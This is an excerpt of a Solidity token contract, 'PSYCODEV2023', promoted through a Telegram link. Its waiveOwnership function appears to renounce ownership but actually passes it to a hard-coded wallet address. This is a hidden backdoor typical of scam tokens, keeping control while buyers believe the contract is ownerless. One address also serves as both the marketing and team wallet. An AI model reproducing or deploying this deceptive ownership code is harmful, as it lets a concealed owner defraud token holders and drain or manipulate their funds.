...
/**
TELEGRAM : https://t.me/psycocall_official
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x6b9c8aA14E2A7c87a33C3C8fEa222d77Fb0b6B25);
    }
...
contract PSYCODEV2023 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PSYCODEV2023";
    string private _symbol = "PD 2023";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3EeE02E42E5a982c3d55CBE73bFE2f686fEae12C);
    address payable public teamWalletAddress = payable(0x3EeE02E42E5a982c3d55CBE73bFE2f686fEae12C);
